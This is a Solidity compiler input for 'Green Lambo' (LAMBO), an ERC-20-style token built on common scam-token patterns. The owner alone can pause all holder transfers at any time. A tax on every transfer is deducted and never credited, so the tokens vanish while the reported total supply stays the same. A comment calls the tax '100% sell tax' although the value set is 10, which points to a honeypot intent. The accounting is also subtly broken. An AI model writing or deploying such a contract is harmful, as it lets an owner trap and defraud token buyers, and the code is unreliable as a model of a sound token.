{{
  "language": "Solidity",
  "sources": {
    "lambo.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract LAMBO {\n    string public name = \"Green Lambo\";\n    string public symbol = \"LAMBO\";\n    uint256 public totalSupply = 1_000_000_000 * 10 ** 18; // 1 billion tokens\n    uint8 public decimals = 18;\n\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    address public owner;\n\n    bool public sellingPaused = false;\n    uint256 public sellTaxPercentage = 10; // 100% sell tax\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only the owner can call this function.\");\n        _;\n    }\n\n    modifier whenNotPaused() {\n        require(!sellingPaused, \"Selling is paused.\");\n        _;\n    }\n\n    constructor() {\n        balanceOf[msg.sender] = totalSupply;\n        owner = msg.sender;\n    }\n\n    function transfer(address to, uint256 value) external whenNotPaused returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    }\n\n    function transferFrom(address from, address to, uint256 value) external whenNotPaused returns (bool) {\n        require(value <= balanceOf[from], \"Insufficient balance\");\n        require(value <= allowance[from][msg.sender], \"Insufficient allowance\");\n\n        allowance[from][msg.sender] -= value;\n        _transfer(from, to, value);\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\n        uint256 currentValue = allowance[msg.sender][spender];\n        allowance[msg.sender][spender] = currentValue + addedValue;\n\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\n        uint256 currentValue = allowance[msg.sender][spender];\n        require(currentValue >= subtractedValue, \"Decreased allowance below zero\");\n\n        allowance[msg.sender][spender] = currentValue - subtractedValue;\n\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\n        return true;\n    }\n\n    function pauseSelling() external onlyOwner {\n        sellingPaused = true;\n    }\n\n    function resumeSelling() external onlyOwner {\n        sellingPaused = false;\n    }\n\n    function withdrawCurrency(address payable to, uint256 amount) external onlyOwner {\n        require(amount <= address(this).balance, \"Insufficient contract balance\");\n        to.transfer(amount);\n    }\n\n    function _transfer(address from, address to, uint256 value) internal {\n        require(to != address(0), \"Invalid recipient\");\n        require(value <= balanceOf[from], \"Insufficient balance\");\n\n        uint256 sellTaxAmount = (value * sellTaxPercentage) / 100;\n        uint256 transferAmount = value - sellTaxAmount;\n\n        balanceOf[from] -= value;\n        balanceOf[to] += transferAmount;\n\n        emit Transfer(from, to, transferAmount);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}